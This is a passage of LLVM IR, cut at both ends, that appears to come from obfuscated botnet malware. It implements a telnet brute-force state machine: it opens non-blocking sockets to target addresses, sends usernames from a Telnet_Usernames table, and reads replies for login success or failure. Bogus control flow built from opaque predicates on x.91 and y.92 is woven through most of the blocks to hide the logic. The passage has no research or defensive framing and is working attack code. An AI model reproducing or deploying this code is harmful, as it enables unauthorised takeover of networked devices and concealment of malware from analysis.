  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %239, i16* %240, align 2
  %241 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %242 = getelementptr inbounds [8 x i8], [8 x i8]* %241, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %242, i8 0, i64 8, i32 4, i1 false)
  %243 = load i32, i32* %6, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 2
  %247 = load i32, i32* %246, align 8
  %248 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %249 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %248, i32 0, i32 0
  store i32 %247, i32* %249, align 4
  %250 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %251 = load i32, i32* %6, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 0
  store i32 %250, i32* %254, align 8
  %255 = load i32, i32* %6, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %256
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = icmp eq i32 %259, -1
  br i1 %260, label %261, label %262

; <label>:261:                                    ; preds = %237
  br label %1286

; <label>:262:                                    ; preds = %237
  %263 = load i32, i32* %6, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %264
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 8
  %268 = load i32, i32* %6, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 8
  %273 = call i32 (i32, i32, ...) @fcntl(i32 %272, i32 3, i8* null)
  %274 = or i32 %273, 2048
  %275 = call i32 (i32, i32, ...) @fcntl(i32 %267, i32 4, i32 %274)
  %276 = load i32, i32* %6, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 8
  %281 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %282 = call i32 @connect(i32 %280, %struct.sockaddr* %281, i32 16)
  %283 = icmp eq i32 %282, -1
  br i1 %283, label %284, label %308

; <label>:284:                                    ; preds = %262
  %285 = load i32, i32* @x.91
  %286 = load i32, i32* @y.92
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %284
  %293 = call i32* @__errno_location() #10
  %294 = load i32, i32* %293, align 4
  %295 = icmp ne i32 %294, 115
  %296 = load i32, i32* @x.91
  %297 = load i32, i32* @y.92
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %295, label %304, label %308

; <label>:304:                                    ; preds = %originalBBpart216
  %305 = load i32, i32* %6, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %306
  call void @reset_telstate(%struct.telstate_t* %307)
  br label %328

; <label>:308:                                    ; preds = %originalBBpart216, %262
  %309 = load i32, i32* @x.91
  %310 = load i32, i32* @y.92
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %308
  %317 = load i32, i32* %6, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %318
  call void @advance_telstate(%struct.telstate_t* %319, i32 1)
  %320 = load i32, i32* @x.91
  %321 = load i32, i32* @y.92
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %328

; <label>:328:                                    ; preds = %originalBBpart220, %304
  %329 = load i32, i32* @x.91
  %330 = load i32, i32* @y.92
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %328
  %337 = load i32, i32* @x.91
  %338 = load i32, i32* @y.92
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %1285

; <label>:345:                                    ; preds = %138
  br label %346

; <label>:346:                                    ; preds = %345
  %347 = load i32, i32* @x.91
  %348 = load i32, i32* @y.92
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %346
  %355 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %356 = getelementptr inbounds [16 x i64], [16 x i64]* %355, i64 0, i64 0
  %357 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %356) #5, !srcloc !6
  %358 = extractvalue { i64, i64* } %357, 0
  %359 = extractvalue { i64, i64* } %357, 1
  %360 = trunc i64 %358 to i32
  store i32 %360, i32* %21, align 4
  %361 = ptrtoint i64* %359 to i64
  %362 = trunc i64 %361 to i32
  store i32 %362, i32* %22, align 4
  %363 = load i32, i32* @x.91
  %364 = load i32, i32* @y.92
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %371

; <label>:371:                                    ; preds = %originalBBpart228
  br label %372

; <label>:372:                                    ; preds = %371
  %373 = load i32, i32* %6, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 0
  %377 = load i32, i32* %376, align 8
  %378 = srem i32 %377, 64
  %379 = zext i32 %378 to i64
  %380 = shl i64 1, %379
  %381 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %382 = load i32, i32* %6, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 0
  %386 = load i32, i32* %385, align 8
  %387 = sdiv i32 %386, 64
  %388 = sext i32 %387 to i64
  %389 = getelementptr inbounds [16 x i64], [16 x i64]* %381, i64 0, i64 %388
  %390 = load i64, i64* %389, align 8
  %391 = or i64 %390, %380
  store i64 %391, i64* %389, align 8
  %392 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %392, align 8
  %393 = load i32, i32* %3, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %394, i64* %395, align 8
  %396 = load i32, i32* %6, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %397
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %398, i32 0, i32 0
  %400 = load i32, i32* %399, align 8
  %401 = add nsw i32 %400, 1
  %402 = call i32 @select(i32 %401, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %402, i32* %7, align 4
  %403 = load i32, i32* %7, align 4
  %404 = icmp eq i32 %403, 1
  br i1 %404, label %405, label %473

; <label>:405:                                    ; preds = %372
  %406 = load i32, i32* @x.91
  %407 = load i32, i32* @y.92
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %405
  %414 = load i32, i32* %6, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 9
  store i32 0, i32* %417, align 8
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %418 = load i32, i32* %6, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = bitcast i32* %15 to i8*
  %424 = call i32 @getsockopt(i32 %422, i32 1, i32 4, i8* %423, i32* %14) #5
  %425 = load i32, i32* %15, align 4
  %426 = icmp ne i32 %425, 0
  %427 = load i32, i32* @x.91
  %428 = load i32, i32* @y.92
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %426, label %435, label %439

; <label>:435:                                    ; preds = %originalBBpart232
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %437
  call void @reset_telstate(%struct.telstate_t* %438)
  br label %472

; <label>:439:                                    ; preds = %originalBBpart232
  %440 = load i32, i32* @x.91
  %441 = load i32, i32* @y.92
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %439
  %448 = load i32, i32* %6, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %449
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 8
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 0
  %457 = load i32, i32* %456, align 8
  %458 = call i32 (i32, i32, ...) @fcntl(i32 %457, i32 3, i8* null)
  %459 = and i32 %458, -2049
  %460 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 4, i32 %459)
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %462
  call void @advance_telstate(%struct.telstate_t* %463, i32 2)
  %464 = load i32, i32* @x.91
  %465 = load i32, i32* @y.92
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart243, label %originalBB34alteredBB

originalBBpart243:                                ; preds = %originalBB34
  br label %472

; <label>:472:                                    ; preds = %originalBBpart243, %435
  br label %1286

; <label>:473:                                    ; preds = %372
  %474 = load i32, i32* %7, align 4
  %475 = icmp eq i32 %474, -1
  br i1 %475, label %476, label %480

; <label>:476:                                    ; preds = %473
  %477 = load i32, i32* %6, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %478
  call void @reset_telstate(%struct.telstate_t* %479)
  br label %1286

; <label>:480:                                    ; preds = %473
  %481 = load i32, i32* @x.91
  %482 = load i32, i32* @y.92
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %480
  %489 = load i32, i32* @x.91
  %490 = load i32, i32* @y.92
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %497

; <label>:497:                                    ; preds = %originalBBpart247
  %498 = load i32, i32* %6, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 9
  %502 = load i32, i32* %501, align 8
  %503 = add i32 %502, 7
  %504 = zext i32 %503 to i64
  %505 = call i64 @time(i64* null) #5
  %506 = icmp slt i64 %504, %505
  br i1 %506, label %507, label %511

; <label>:507:                                    ; preds = %497
  %508 = load i32, i32* %6, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %509
  call void @reset_telstate(%struct.telstate_t* %510)
  br label %511

; <label>:511:                                    ; preds = %507, %497
  br label %1285

; <label>:512:                                    ; preds = %138
  %513 = load i32, i32* %6, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %514
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %515, i32 0, i32 0
  %517 = load i32, i32* %516, align 8
  %518 = load i32, i32* %3, align 4
  %519 = load i32, i32* %6, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 11
  %523 = load i8*, i8** %522, align 8
  %524 = call i32 @read_until_response(i32 %517, i32 %518, i8* %523, i32 1024, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %525 = icmp ne i32 %524, 0
  br i1 %525, label %526, label %581

; <label>:526:                                    ; preds = %512
  %527 = load i32, i32* @x.91
  %528 = load i32, i32* @y.92
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %526
  %535 = call i64 @time(i64* null) #5
  %536 = trunc i64 %535 to i32
  %537 = load i32, i32* %6, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 9
  store i32 %536, i32* %540, align 8
  %541 = load i32, i32* %6, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %542
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %543, i32 0, i32 11
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @contains_fail(i8* %545)
  %547 = icmp ne i32 %546, 0
  %548 = load i32, i32* @x.91
  %549 = load i32, i32* @y.92
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %547, label %556, label %576

; <label>:556:                                    ; preds = %originalBBpart251
  %557 = load i32, i32* @x.91
  %558 = load i32, i32* @y.92
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %556
  %565 = load i32, i32* %6, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %566
  call void @advance_telstate(%struct.telstate_t* %567, i32 0)
  %568 = load i32, i32* @x.91
  %569 = load i32, i32* @y.92
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %580

; <label>:576:                                    ; preds = %originalBBpart251
  %577 = load i32, i32* %6, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %578
  call void @advance_telstate(%struct.telstate_t* %579, i32 3)
  br label %580

; <label>:580:                                    ; preds = %576, %originalBBpart255
  br label %1286

; <label>:581:                                    ; preds = %512
  %582 = load i32, i32* %6, align 4
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %583
  %585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %584, i32 0, i32 9
  %586 = load i32, i32* %585, align 8
  %587 = add i32 %586, 7
  %588 = zext i32 %587 to i64
  %589 = call i64 @time(i64* null) #5
  %590 = icmp slt i64 %588, %589
  br i1 %590, label %591, label %595

; <label>:591:                                    ; preds = %581
  %592 = load i32, i32* %6, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %593
  call void @reset_telstate(%struct.telstate_t* %594)
  br label %595

; <label>:595:                                    ; preds = %591, %581
  %596 = load i32, i32* @x.91
  %597 = load i32, i32* @y.92
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %595
  %604 = load i32, i32* @x.91
  %605 = load i32, i32* @y.92
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %1285

; <label>:612:                                    ; preds = %138
  %613 = load i32, i32* %6, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %614
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %615, i32 0, i32 0
  %617 = load i32, i32* %616, align 8
  %618 = load i32, i32* %6, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 5
  %622 = load i8, i8* %621, align 2
  %623 = zext i8 %622 to i64
  %624 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %623
  %625 = load i8*, i8** %624, align 8
  %626 = load i32, i32* %6, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 5
  %630 = load i8, i8* %629, align 2
  %631 = zext i8 %630 to i64
  %632 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %631
  %633 = load i8*, i8** %632, align 8
  %634 = call i64 @strlen(i8* %633) #9
  %635 = call i64 @send(i32 %617, i8* %625, i64 %634, i32 16384)
  %636 = icmp slt i64 %635, 0
  br i1 %636, label %637, label %641

; <label>:637:                                    ; preds = %612
  %638 = load i32, i32* %6, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %639
  call void @reset_telstate(%struct.telstate_t* %640)
  br label %1286

; <label>:641:                                    ; preds = %612
  %642 = load i32, i32* @x.91
  %643 = load i32, i32* @y.92
  %644 = sub i32 %642, 1
  %645 = mul i32 %642, %644
  %646 = urem i32 %645, 2
  %647 = icmp eq i32 %646, 0
  %648 = icmp slt i32 %643, 10
  %649 = or i1 %647, %648
  br i1 %649, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %641
  %650 = load i32, i32* %6, align 4
  %651 = sext i32 %650 to i64
  %652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %651
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %652, i32 0, i32 0
  %654 = load i32, i32* %653, align 8
  %655 = call i64 @send(i32 %654, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %656 = icmp slt i64 %655, 0
  %657 = load i32, i32* @x.91
  %658 = load i32, i32* @y.92
  %659 = sub i32 %657, 1
  %660 = mul i32 %657, %659
  %661 = urem i32 %660, 2
  %662 = icmp eq i32 %661, 0
  %663 = icmp slt i32 %658, 10
  %664 = or i1 %662, %663
  br i1 %664, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %656, label %665, label %669

; <label>:665:                                    ; preds = %originalBBpart263
  %666 = load i32, i32* %6, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %667
  call void @reset_telstate(%struct.telstate_t* %668)
  br label %1286

; <label>:669:                                    ; preds = %originalBBpart263
  %670 = load i32, i32* %6, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %671
  call void @advance_telstate(%struct.telstate_t* %672, i32 4)
  br label %1285

; <label>:673:                                    ; preds = %138
  %674 = load i32, i32* %6, align 4
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 0
  %678 = load i32, i32* %677, align 8
  %679 = load i32, i32* %3, align 4
  %680 = load i32, i32* %6, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %681
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %682, i32 0, i32 11
  %684 = load i8*, i8** %683, align 8
  %685 = call i32 @read_until_response(i32 %678, i32 %679, i8* %684, i32 1024, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %686 = icmp ne i32 %685, 0
  br i1 %686, label %687, label %742

; <label>:687:                                    ; preds = %673
  %688 = load i32, i32* @x.91
  %689 = load i32, i32* @y.92
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %687
  %696 = call i64 @time(i64* null) #5
  %697 = trunc i64 %696 to i32
  %698 = load i32, i32* %6, align 4
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %699
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %700, i32 0, i32 9
  store i32 %697, i32* %701, align 8
  %702 = load i32, i32* %6, align 4
  %703 = sext i32 %702 to i64
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %703
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %704, i32 0, i32 11
  %706 = load i8*, i8** %705, align 8
  %707 = call i32 @contains_fail(i8* %706)
  %708 = icmp ne i32 %707, 0
  %709 = load i32, i32* @x.91
  %710 = load i32, i32* @y.92
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %708, label %717, label %721

; <label>:717:                                    ; preds = %originalBBpart267
  %718 = load i32, i32* %6, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %719
  call void @advance_telstate(%struct.telstate_t* %720, i32 0)
  br label %725

; <label>:721:                                    ; preds = %originalBBpart267
  %722 = load i32, i32* %6, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %723
  call void @advance_telstate(%struct.telstate_t* %724, i32 5)
  br label %725

; <label>:725:                                    ; preds = %721, %717
  %726 = load i32, i32* @x.91
  %727 = load i32, i32* @y.92
  %728 = sub i32 %726, 1
  %729 = mul i32 %726, %728
  %730 = urem i32 %729, 2
  %731 = icmp eq i32 %730, 0
  %732 = icmp slt i32 %727, 10
  %733 = or i1 %731, %732
  br i1 %733, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %725
  %734 = load i32, i32* @x.91
  %735 = load i32, i32* @y.92
  %736 = sub i32 %734, 1
  %737 = mul i32 %734, %736
  %738 = urem i32 %737, 2
  %739 = icmp eq i32 %738, 0
  %740 = icmp slt i32 %735, 10
  %741 = or i1 %739, %740
  br i1 %741, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %1286

; <label>:742:                                    ; preds = %673
  %743 = load i32, i32* @x.91
  %744 = load i32, i32* @y.92
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %742
  %751 = load i32, i32* %6, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 9
  %755 = load i32, i32* %754, align 8
  %756 = add i32 %755, 7
  %757 = zext i32 %756 to i64
  %758 = call i64 @time(i64* null) #5
  %759 = icmp slt i64 %757, %758
  %760 = load i32, i32* @x.91
  %761 = load i32, i32* @y.92
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBBpart290, label %originalBB73alteredBB

originalBBpart290:                                ; preds = %originalBB73
  br i1 %759, label %768, label %788

; <label>:768:                                    ; preds = %originalBBpart290
  %769 = load i32, i32* @x.91
  %770 = load i32, i32* @y.92
  %771 = sub i32 %769, 1
  %772 = mul i32 %769, %771
  %773 = urem i32 %772, 2
  %774 = icmp eq i32 %773, 0
  %775 = icmp slt i32 %770, 10
  %776 = or i1 %774, %775
